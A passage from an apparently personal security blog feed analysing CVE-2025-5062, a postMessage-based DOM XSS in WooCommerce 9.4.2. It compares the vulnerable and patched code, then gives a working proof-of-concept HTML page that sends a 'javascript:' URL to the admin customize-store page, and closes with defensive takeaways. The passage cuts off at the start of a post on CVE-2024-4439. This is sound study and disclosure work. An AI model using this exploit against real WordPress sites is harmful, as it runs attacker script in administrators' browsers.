(6.1)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/woocommerce/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress WooCommerce Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin versions&lt;/strong&gt; - &lt;strong&gt;WooCommerce&lt;/strong&gt;: &lt;strong&gt;9.4.2&lt;/strong&gt; (vulnerable) and &lt;strong&gt;9.4.3&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff/comparison tool to inspect differences between the two versions.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;In the &lt;strong&gt;vulnerable&lt;/strong&gt; version, &lt;code&gt;attachParentListeners()&lt;/code&gt; listens to all messages from any origin without checking the origin; data from the message is assigned directly into the DOM which leads to &lt;strong&gt;PostMessage-Based XSS&lt;/strong&gt; (a subtype of &lt;strong&gt;DOM‑based XSS&lt;/strong&gt;).&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;export function attachParentListeners() {&#xA;&#x9;const listener = ( event ) =&amp;gt; {&#xA;    if ( event.data.type === &amp;#39;navigate&amp;#39; ) {&#xA;&#x9;&#x9;&#x9;window.location.href = event.data.url;&#xA;    }&#xA;&#x9;};&#xA;  window.addEventListener( &amp;#39;message&amp;#39;, listener, false );&#xA;  return () =&amp;gt; {&#xA;    window.removeEventListener( &amp;#39;message&amp;#39;, listener, false );&#xA;  };&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;{: file=&amp;ldquo;client/admin/client/customize-store/utils.js v9.4.2&amp;rdquo;}&lt;/p&gt;&#xA;&lt;p&gt;In the &lt;strong&gt;patched&lt;/strong&gt; version, more checks and restrictions were added compared to the vulnerable version, moving from &lt;code&gt;&amp;quot;accept every message and redirect straight away&amp;quot;&lt;/code&gt; to &lt;code&gt;&amp;quot;only accept trusted messages, validate structure and check the URL before navigation&amp;quot;&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;export function attachParentListeners() {&#xA;  const allowedOrigins = [ getAdminSetting( &amp;#39;homeUrl&amp;#39; ) ];&#xA;&#xA;&#x9;function handleMessage( event ) {&#xA;&#x9;&#x9;// Validate the origin.&#xA;&#x9;&#x9;if ( ! allowedOrigins.includes( event.origin ) ) {&#xA;&#x9;&#x9;&#x9;// Blocked message from untrusted origin: event.origin.&#xA;&#x9;&#x9;&#x9;return;&#xA;&#x9;&#x9;}&#xA;&#xA;&#x9;&#x9;// Validate the structure of event.data.&#xA;&#x9;&#x9;if (&#xA;&#x9;&#x9;&#x9;! event.data ||&#xA;&#x9;&#x9;&#x9;typeof event.data.type !== &amp;#39;string&amp;#39; ||&#xA;&#x9;&#x9;&#x9;typeof event.data.url !== &amp;#39;string&amp;#39;&#xA;&#x9;&#x9;) {&#xA;&#x9;&#x9;&#x9;// Invalid message structure: event.data.&#xA;&#x9;&#x9;&#x9;return;&#xA;&#x9;&#x9;}&#xA;&#xA;&#x9;&#x9;// Only allow the &amp;#39;navigate&amp;#39; type.&#xA;&#x9;&#x9;if ( event.data.type === &amp;#39;navigate&amp;#39; ) {&#xA;      // Validate the URL format.&#xA;&#x9;&#x9;&#x9;try {&#xA;&#x9;&#x9;&#x9;&#x9;const url = parseAdminUrl( event.data.url );&#xA;&#x9;&#x9;&#x9;&#x9;// Further restrict navigation to trusted domains.&#xA;&#x9;&#x9;&#x9;&#x9;if (&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;! allowedOrigins.some( ( origin ) =&amp;gt; url.origin === origin )&#xA;&#x9;&#x9;&#x9;&#x9;) {&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;throw new Error(&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&#x9;`Blocked navigation to untrusted URL: ${ url.href }`&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;);&#xA;&#x9;&#x9;&#x9;&#x9;}&#xA;&#xA;&#x9;&#x9;&#x9;&#x9;window.location.href = url.href;&#xA;&#x9;&#x9;&#x9;} catch ( error ) {&#xA;&#x9;&#x9;&#x9;&#x9;// Invalid URL: event.data.url.&#xA;&#x9;&#x9;&#x9;&#x9;captureException( error );&#xA;&#x9;&#x9;&#x9;}&#xA;&#x9;&#x9;}&#xA;    }&#xA;    window.addEventListener( &amp;#39;message&amp;#39;, handleMessage, false );&#xA;    &#x9;return function removeListener() {&#xA;&#x9;&#x9;window.removeEventListener( &amp;#39;message&amp;#39;, handleMessage, false );&#xA;&#x9;};&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;{: file=&amp;ldquo;client/admin/client/customize-store/utils.js v9.4.3&amp;rdquo;}&lt;/p&gt;&#xA;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-10-cve-2025-5062/dif1.png&#39; alt=&#34;Diff — so sánh thay đổi mã giữa bản vulnerable và bản patched&#34; height=&#34;892&#34; width=&#34;683&#34;&gt;&#xA;&lt;em&gt;Diff — Comparison of source changes between the vulnerable and patched versions&lt;/em&gt;&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Although I found the source and sink, when analyzing the plugin source after download I initially could not find the function &lt;code&gt;attachParentListeners()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-10-cve-2025-5062/search1.png&#39; alt=&#34;Kết quả tìm kiếm attachParentListeners()&#34; height=&#34;214&#34; width=&#34;574&#34;&gt;&#xA;&lt;em&gt;Search results for attachParentListeners()&lt;/em&gt;&lt;/p&gt;&#xA;&lt;p&gt;I thought my setup had failed and the code hadn&amp;rsquo;t been fully downloaded. But no — when searching for the keyword &lt;code&gt;&amp;quot;navigate&amp;quot;&lt;/code&gt; I found a function with a different name but the same functionality as &lt;code&gt;attachParentListeners()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-10-cve-2025-5062/search2.png&#39; alt=&#34;Kết quả tìm kiếm “navigate”&#34; height=&#34;307&#34; width=&#34;1284&#34;&gt;&#xA;&lt;em&gt;Search results for &amp;ldquo;navigate&amp;rdquo;&lt;/em&gt;&lt;/p&gt;&#xA;&lt;p&gt;👉 In the product build, to optimize browser load time the plugin used &lt;a href=&#34;https://digitalm.sg/seo-terms/minification/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;minification&lt;/a&gt; which removes whitespace, renames functions/variables to short names, and partially obfuscates the code making it harder to read.&lt;/p&gt;&#xA;&lt;p&gt;The downloaded file was named &lt;code&gt;5292.js&lt;/code&gt; instead of &lt;code&gt;utils.js&lt;/code&gt;. After beautifying the code, I found &lt;code&gt;5292.js&lt;/code&gt; contains the &lt;code&gt;utils.js&lt;/code&gt; code and many other files&amp;rsquo; code.&lt;/p&gt;&#xA;&lt;p&gt;Visiting the &lt;code&gt;customize-store&lt;/code&gt; page and sending a &lt;strong&gt;postMessage&lt;/strong&gt; through the browser console:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;http://localhost/wp-admin/admin.php?page=wc-admin&amp;amp;path=%2Fcustomize-store&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-10-cve-2025-5062/xss1.png&#39; alt=&#34;Sự kiện alert() khi postMessage từ console browser&#34; height=&#34;481&#34; width=&#34;1224&#34;&gt;&#xA;&lt;em&gt;An alert() event triggered when postMessage is sent from the browser console&lt;/em&gt;&lt;/p&gt;&#xA;&lt;p&gt;👉 &lt;code&gt;alert()&lt;/code&gt; is triggered. Using the browser debugger I checked which file &lt;code&gt;5292.js&lt;/code&gt; was loaded from in the browser.&lt;/p&gt;&#xA;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-10-cve-2025-5062/debug1.png&#39; alt=&#34;5292.js từ debug của browser&#34; height=&#34;172&#34; width=&#34;1160&#34;&gt;&#xA;&lt;em&gt;5292.js from browser debugger&lt;/em&gt;&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;sources--sinks&#34;&gt;&lt;span&gt;Sources &amp;amp; Sinks&lt;/span&gt;&#xA;  &lt;a href=&#34;#sources--sinks&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Source&lt;/strong&gt;: &lt;code&gt;event.data&lt;/code&gt; from &lt;code&gt;window.postMessage&lt;/code&gt; (specifically &lt;code&gt;event.data.url&lt;/code&gt;)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Sink&lt;/strong&gt;: &lt;code&gt;window.location.href = event.data.url&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ul&gt;&#xA;&lt;li&gt;Create a webpage with the following source:&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;!DOCTYPE html&amp;gt;&#xA;&amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt;&#xA;&#xA;&amp;lt;head&amp;gt;&#xA;    &amp;lt;meta charset=&amp;#34;UTF-8&amp;#34;&amp;gt;&#xA;    &amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.0&amp;#34;&amp;gt;&#xA;    &amp;lt;title&amp;gt;Document&amp;lt;/title&amp;gt;&#xA;&amp;lt;/head&amp;gt;&#xA;&#xA;&amp;lt;body&amp;gt;&#xA;    &amp;lt;button id=&amp;#34;openPopup&amp;#34;&amp;gt;Open Popup&amp;lt;/button&amp;gt;&#xA;&#xA;    &amp;lt;script&amp;gt;&#xA;        let popup;&#xA;&#xA;        document.getElementById(&amp;#34;openPopup&amp;#34;).addEventListener(&amp;#34;click&amp;#34;, () =&amp;gt; {&#xA;            // Open a popup&#xA;            popup = window.open(&#xA;                &amp;#34;http://localhost/wp-admin/admin.php?page=wc-admin&amp;amp;path=%2Fcustomize-store&amp;#34;, &#xA;                &amp;#34;popupWindow&amp;#34;,&#xA;                &amp;#34;width=400,height=300&amp;#34;&#xA;            );&#xA;&#xA;            // Wait for the popup to load&#xA;            const interval = setInterval(() =&amp;gt; {&#xA;                if (popup &amp;amp;&amp;amp; !popup.closed) {&#xA;                    // Send message&#xA;                    popup.postMessage({ type: &amp;#39;navigate&amp;#39;, url: &amp;#39;javascript:alert(&amp;#34;phu0c ph4m&amp;#34;)&amp;#39; }, &amp;#39;*&amp;#39;);&#xA;                    clearInterval(interval);&#xA;                }&#xA;            }, 5000);&#xA;        });&#xA;    &amp;lt;/script&amp;gt;&#xA;&amp;lt;/body&amp;gt;&#xA;&#xA;&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;An admin visits the webpage and clicks &lt;code&gt;Open Popup&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;After 5s, the JavaScript event is triggered.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-10-cve-2025-5062/xss2.png&#39; alt=&#34;Sự kiện JavaScript từ popup&#34; height=&#34;572&#34; width=&#34;864&#34;&gt;&#xA;&lt;em&gt;JavaScript event from the popup&lt;/em&gt;&lt;/p&gt;&#xA;&lt;p&gt;👉 Matches the CVE description.&lt;/p&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;The popup cannot auto-open without a user interaction&#xA;{: .prompt-info }&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;p&gt;Here, an &lt;code&gt;&amp;lt;iframe&amp;gt;&lt;/code&gt; can&amp;rsquo;t be used because &lt;code&gt;X-Frame-Options: SAMEORIGIN&lt;/code&gt; is set in the response — only same-origin embedding is allowed.&lt;/p&gt;&#xA;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-10-cve-2025-5062/req1.png&#39; alt=&#34;X-Frame-Options: SAMEORIGIN được set trong response&#34; height=&#34;332&#34; width=&#34;1493&#34;&gt;&#xA;&lt;em&gt;X-Frame-Options: SAMEORIGIN is set in the response&lt;/em&gt;&lt;/p&gt;&#xA;&lt;hr&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;CVE-2025-5062&lt;/strong&gt; vulnerability in &lt;strong&gt;WooCommerce &amp;lt;= 9.4.2&lt;/strong&gt; is a &lt;strong&gt;PostMessage‑based DOM XSS&lt;/strong&gt;. An unauthenticated attacker can send a malicious message to the &lt;strong&gt;customize-store&lt;/strong&gt; page causing the victim&amp;rsquo;s browser to execute script if the victim interacts (via popup/link). The &lt;strong&gt;9.4.3&lt;/strong&gt; patch validates origin, verifies message structure, and whitelists URLs before redirecting.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Key takeaways&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;PostMessage‑based DOM XSS&lt;/strong&gt; can execute script when the user interacts (popup/link).&lt;/li&gt;&#xA;&lt;li&gt;Data from &lt;strong&gt;postMessage&lt;/strong&gt; must always be treated as untrusted.&lt;/li&gt;&#xA;&lt;li&gt;Always &lt;strong&gt;validate origin, check the message structure and URL&lt;/strong&gt; before redirecting.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Update the plugin&lt;/strong&gt; to the latest patched version to prevent exploitation.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;hr&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://portswigger.net/web-security/cross-site-scripting/cheat-sheet&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Cross-site scripting (XSS) cheat sheet — PortSwigger&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/woocommerce/vulnerability/wordpress-woocommerce-plugin-9-3-2-9-4-9-4-2-postmessage-based-cross-site-scripting&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress WooCommerce &amp;lt;= 9.3.2 and from 9.4 through 9.4.2 — CVE-2025-5062&lt;/a&gt;&lt;/p&gt;&#xA;&lt;hr&gt;</description>
    </item>
    <item>
      <title>CVE-2024-4439 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-10-09-cve-2024-4439/</link>
      <pubDate>Thu, 09 Oct 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-10-09-cve-2024-4439/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-09-cve-2024-4439/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;WordPress Core&lt;/strong&gt; is &lt;strong&gt;vulnerable to Stored 